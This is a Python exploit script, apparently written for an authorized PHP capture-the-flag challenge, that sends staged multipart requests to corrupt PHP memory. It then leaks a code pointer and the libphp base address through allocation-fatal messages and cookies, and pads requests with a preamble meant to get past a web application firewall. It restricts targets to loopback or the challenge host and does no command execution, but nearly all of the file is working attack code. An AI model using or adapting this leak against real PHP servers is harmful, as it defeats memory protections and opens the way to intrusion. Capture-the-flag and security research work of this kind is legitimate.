#!/usr/bin/env python3
"""Bounded code-pointer oracle for the authorized Cloudflare PHP CTF.

The native code16 producer with 65 leading fields places stale ``PS(id)`` at
``HT+0x10``.  Exact-twin GDB calibration showed 67 fields at ``HT+0x30``;
therefore 66 is the single measured midpoint for ``HT = PS(id)-0x20``.  The
stale string length then aliases ``HashTable.pDestructor`` and PHP's URL
encoder reports ``3 * zval_ptr_dtor + 32`` in its allocation fatal.

This driver is leak-only.  It has no command-execution or verifier path.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
from pathlib import Path
import re
import struct
import time
import urllib.parse

import held_kb_leak as held
import hybrid8511 as h


OOM_TRIED_RE = re.compile(rb"tried to allocate ([0-9]+) bytes")
FIELD_COUNTS = (63, 65, 66, 67)


def integer(value: str) -> int:
    try:
        return int(value, 0)
    except ValueError as error:
        raise argparse.ArgumentTypeError("expected an integer") from error


def code_shape(field_count: int):
    base = h.kb.CODE_SHAPE
    return h.kb.ProducerShape(
        depth=base.depth,
        count=base.count,
        field_count=field_count,
        field_value_size=base.field_value_size,
    )


def fatal_observation(raw: bytes, response_complete: bool) -> dict | None:
    """Return one strict fatal-derived code candidate, never raw response data."""
    if not response_complete:
        return None
    entity = held.response_entity(raw)
    if entity is None or entity.rstrip(b"\r\n") == held.TRANSIENT_DISCONNECT:
        return None
    values = {int(match) for match in OOM_TRIED_RE.findall(entity)}
    accepted = []
    for tried_bytes in sorted(values):
        candidate = h.debian_fatal_code_candidate(tried_bytes)
        if candidate is not None:
            accepted.append(candidate)
    if len(accepted) != 1:
        return None
    return accepted[0]


def code_observation(row: dict) -> dict | None:
    raw = row.get("raw") or b""
    response_complete = bool(row.get("response_complete", False))
    fatal = fatal_observation(raw, response_complete)
    cookie = h.cookie_from_raw(raw) if response_complete else b""
    cookie_candidate = h.debian_code_candidate(cookie)
    candidates = [item for item in (fatal, cookie_candidate) if item is not None]
    if not candidates:
        return None
    identities = {
        (item["dtor"], item["libphp"], item["profile_offset"])
        for item in candidates
    }
    if len(identities) != 1:
        return None
    candidate = dict(candidates[0])
    candidate["label"] = row.get("label")
    candidate["response_sha256"] = hashlib.sha256(raw).hexdigest()
    candidate["sources"] = sorted({item["oracle"] for item in candidates})
    return candidate


def sixteen_cookie_observation(row: dict) -> dict | None:
    """Preserve the two QWORDs of a private 16-byte cookie for adjudication."""
    raw = row.get("raw") or b""
    if not bool(row.get("response_complete", False)):
        return None
    cookie = h.cookie_from_raw(raw)
    if len(cookie) != 16:
        return None
    first, second = struct.unpack("<QQ", cookie)
    canonical = 0x700000000000 <= second < 0x800000000000
    result = {
        "label": row.get("label"),
        "first_qword": first,
        "second_qword": second,
        "second_qword_hex": hex(second),
        "second_is_canonical": canonical,
        "response_sha256": hashlib.sha256(raw).hexdigest(),
    }
    if first == 16 and canonical:
        low21 = second & 0x1FFFFF
        inferred_offset = 0x600000 + low21
        result.update({
            "dtor_low21": low21,
            "band3_offset_candidate": inferred_offset,
            "band3_base_candidate": second - inferred_offset,
            "claim_boundary": (
                "base candidate assumes zval_ptr_dtor remains in the known "
                "0x600000..0x7fffff symbol band"
            ),
        })
    return result


def write_private_receipt(path: Path, document: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    descriptor = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    try:
        with os.fdopen(descriptor, "w", encoding="utf-8") as stream:
            descriptor = -1
            json.dump(document, stream, indent=2)
            stream.write("\n")
            stream.flush()
            os.fsync(stream.fileno())
    finally:
        if descriptor >= 0:
            os.close(descriptor)


def has_epoch_risk(records: list[dict]) -> bool:
    """Return whether any normalized response record marks a disconnect."""
    return any(bool(record.get("transient_disconnect")) for record in records)


def run_wave(args, body: bytes, label: str, extra_headers=None) -> list[dict]:
    requests = []
    try:
        for index in range(args.fanout):
            requests.append(held.HeldRequest(
                args,
                body,
                h.kb.COOKIE_BOUNDARY,
                f"{label}-{index:02d}",
                extra_headers,
            ))
        return held.release_wave(requests)
    finally:
        for request in requests:
            request.close()


def run_prestaged_pair(
    args,
    producer_body: bytes,
    consumer_body: bytes,
    producer_headers=None,
) -> tuple[list[dict], list[dict]]:
    """Stage every A and B request before releasing A, then release B.

    The challenge front buffers an incomplete request body, so staging does not
    claim origin-worker affinity.  It does remove the roughly one-second live
    gap spent constructing the B sockets after all A responses have already
    closed in the legacy schedule.
    """
    requests = []
    try:
        producers = [
            held.HeldRequest(
                args,
                producer_body,
                h.kb.COOKIE_BOUNDARY,
                f"A-{index:02d}",
                producer_headers,
            )
            for index in range(args.fanout)
        ]
        requests.extend(producers)
        consumers = [
            held.HeldRequest(
                args,
                consumer_body,
                h.kb.COOKIE_BOUNDARY,
                f"B-{index:02d}",
            )
            for index in range(args.fanout)
        ]
        requests.extend(consumers)
        producer_rows = held.release_wave(producers)
        consumer_rows = held.release_wave(consumers)
        return producer_rows, consumer_rows
    finally:
        for request in requests:
            request.close()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--field-count", type=int, choices=FIELD_COUNTS, default=67)
    parser.add_argument("--fanout", type=int, choices=range(1, 16), default=1)
    parser.add_argument("--timeout", type=float, default=60.0)
    parser.add_argument("--waf-preamble", type=int, default=0)
    parser.add_argument(
        "--content-type-variant",
        choices=tuple(held.CONTENT_TYPE_TEMPLATES),
        default="canonical",
    )
    parser.add_argument(
        "--prestage-pair",
        action="store_true",
        help=(
            "stage all A and B sockets before releasing A; release B only "
            "after the A responses complete"
        ),
    )
    parser.add_argument("--authorized-live", action="store_true")
    parser.add_argument("--out", required=True)
    args = parser.parse_args()

    parsed = urllib.parse.urlsplit(args.target)
    args.host = parsed.hostname or ""
    args.tls = parsed.scheme == "https"
    args.port = parsed.port or (443 if args.tls else 80)
    args.path = parsed.path or "/"
    local = (
        args.host in held.LOOPBACK
        and not args.tls
        and args.path in {"/index.php", held.LIVE_PATH}
        and not parsed.query
        and not parsed.fragment
    )
    live = (
        args.host == held.LIVE_HOST
        and args.tls
        and args.path == held.LIVE_PATH
        and not parsed.query
        and not parsed.fragment
    )
    if not local and not (live and args.authorized_live):
        parser.error(
            "destination must be loopback or the exact public challenge with "
            "--authorized-live"
        )
    if live and args.path != held.LIVE_PATH:
        parser.error("live path must be exactly /php/index.php")
    if live and args.field_count not in {65, 66}:
        parser.error(
            "the bounded live discriminator permits field-count 65 or 66"
        )
    if live and args.waf_preamble < 1_048_437:
        parser.error("live requests require the measured WAF-safe preamble")

    shape = code_shape(args.field_count)
    producer = h.add_preamble(
        h.kb.producer_body(shape, h.kb.COOKIE_BOUNDARY), args.waf_preamble
    )
    consumer = h.add_preamble(
        h.kb.consumer_body("code", h.kb.COOKIE_BOUNDARY), args.waf_preamble
    )
    cookie_header = "".join(
        h.kb._cookie_name(index) + "=;" for index in range(h.kb.COOKIE_PAIRS)
    )

    began = time.monotonic()
    if args.prestage_pair:
        producer_rows, consumer_rows = run_prestaged_pair(
            args,
            producer,
            consumer,
            {"Cookie": cookie_header},
        )
        schedule = "prestage_A_and_B_release_A_then_B"
    else:
        producer_rows = run_wave(args, producer, "A", {"Cookie": cookie_header})
        consumer_rows = run_wave(args, consumer, "B")
        schedule = "complete_A_then_construct_and_release_B"
    producer_records = [held.record(row) for row in producer_rows]
    consumer_records = [held.record(row) for row in consumer_rows]
    candidates = [
        candidate
        for row in consumer_rows
        if (candidate := code_observation(row)) is not None
    ]
    cookie16_observations = [
        observation
        for row in consumer_rows
        if (observation := sixteen_cookie_observation(row)) is not None
    ]
    identities = {
        (item["dtor"], item["libphp"], item["profile_offset"])
        for item in candidates
    }
    all_records = producer_records + consumer_records
    epoch_risk = has_epoch_risk(all_records)
    stop_classes, stop_reason = held.stop_details(all_records)
    if len(identities) == 1 and not epoch_risk:
        verdict = "STRICT_CODE_POINTER"
        selected = dict(candidates[0])
        selected["votes"] = len(candidates)
        exit_code = 0
    elif len(identities) == 1:
        verdict = "CODE_POINTER_WITH_EPOCH_RISK"
        selected = dict(candidates[0])
        selected["votes"] = len(candidates)
        exit_code = 2
    elif len(identities) > 1:
        verdict = "CONFLICTING_CODE_POINTERS"
        selected = None
        exit_code = 2
    elif stop_classes:
        verdict = "BACKOFF"
        selected = None
        exit_code = 2
    else:
        verdict = "LEAK_MISS"
        selected = None
        exit_code = 2

    document = {
        "schema": "cfctf-r8/code-dtor-fatal-probe/v1",
        "utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "scope": {
            "target": args.target,
            "live": live,
            "method": "POST",
            "requests_sent": args.fanout * 2,
            "terminal_implemented": False,
            "verify_implemented": False,
            "schedule": schedule,
        },
        "geometry": {
            "field_count": args.field_count,
            "baseline_field_count": 65,
            "gdb_observed_baseline_relation": "field65: PS(id) = HT + 0x10",
            "gdb_observed_upper_relation": "field67: PS(id) = HT + 0x30",
            "predicted_relation": "HT = PS(id) - 0x20",
            "fatal_equation": "tried = 3 * zval_ptr_dtor + 32",
        },
        "request_envelope": held.request_envelope(
            args.content_type_variant, h.kb.COOKIE_BOUNDARY
        ),
        "wire": {
            "producer_bytes": len(producer),
            "consumer_bytes": len(consumer),
            "producer_sha256": hashlib.sha256(producer).hexdigest(),
            "consumer_sha256": hashlib.sha256(consumer).hexdigest(),
        },
        "responses": {
            "producer": producer_records,
            "consumer": consumer_records,
        },
        "candidates": candidates,
        "cookie16_observations": cookie16_observations,
        "selected": selected,
        "epoch_risk": epoch_risk,
        "stop_classes": stop_classes,
        "stop_reason": stop_reason,
        "verdict": verdict,
        "elapsed_s": round(time.monotonic() - began, 3),
    }
    output = Path(args.out).resolve()
    write_private_receipt(output, document)
    print(json.dumps({
        "verdict": verdict,
        "selected": selected,
        "epoch_risk": epoch_risk,
        "stop_reason": stop_reason,
        "output": str(output),
    }, indent=2))
    return exit_code


if __name__ == "__main__":
    raise SystemExit(main())
